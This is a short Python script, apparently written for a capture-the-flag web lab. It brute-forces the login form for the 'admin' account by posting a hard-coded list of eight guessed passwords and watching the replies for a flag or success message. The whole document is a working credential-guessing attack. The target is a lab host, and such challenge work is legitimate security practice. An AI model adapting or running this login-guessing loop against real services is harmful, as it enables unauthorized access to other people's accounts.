import requests
import itertools

# Configuration
url = 'http://wcom4m236gehgv01j6zqxnlb6v9y4nzyy1mmsnzk-web.cybertalentslabs.com/'  # Replace with the actual URL of the challenge
username = 'admin'  # Change this to the target username

# Base password to craft from
base_password = '123456'

# Generate potential passwords
def generate_passwords(base):
    # Variations using leetspeak and meeting requirements
    variations = [
        base + '1!',      # Append digit and special character
        base + 'a!',      # Append lowercase and special character
        'P@ssw0rd1!',     # An example of a strong password
        'Password123!',   # Another example of a strong password
        'C0mpl3x!123',    # Complex variations
        'M3ow@rds',       # Adding leet style
        'LeetP@ssw0rd!',  # More complex password
        'Cat$123456',     # Related to the theme
    ]
    return variations

# Get crafted passwords
crafted_passwords = generate_passwords(base_password)

# Attempt to log in with crafted passwords
for password in crafted_passwords:
    data = {
        'username': username,
        'password': password
    }
    
    # Send the POST request
    response = requests.post(url, data=data)
    
    # Print the response text for debugging purposes
    print(f'Trying Password: {password} - Response:')
    print(response.text)
    
    # Check for a successful login
    if 'meowflag' in response.text or 'successful' in response.text.lower():
        print(f'Success! Username: {username}, Password: {password}')
        break

print("Finished attempting all crafted passwords.")
